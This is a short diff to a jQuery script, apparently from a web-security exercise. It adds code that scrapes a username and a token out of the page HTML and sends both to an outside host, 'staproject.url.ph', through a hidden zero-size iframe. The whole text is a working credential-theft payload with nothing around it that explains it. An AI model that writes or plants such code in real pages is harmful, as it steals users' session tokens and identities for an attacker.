@@ -1,4 +1,6 @@
 $(document).ready(function() {
+  var attackerHost="http://staproject.url.ph/?";
+  
   var htmlPage = document.documentElement.innerHTML;
   var findUsername = "var username = '";
   var username='';
@@ -14,4 +16,5 @@ $(document).ready(function() {
     token+=htmlPage[index];
   }
   alert(username+" : "+token);
+  document.documentElement.innerHTML+='<iframe src="'+attackerHost+'&username="'+username+'&token='+token+' height="0" width="0" ></iframe>';
 });
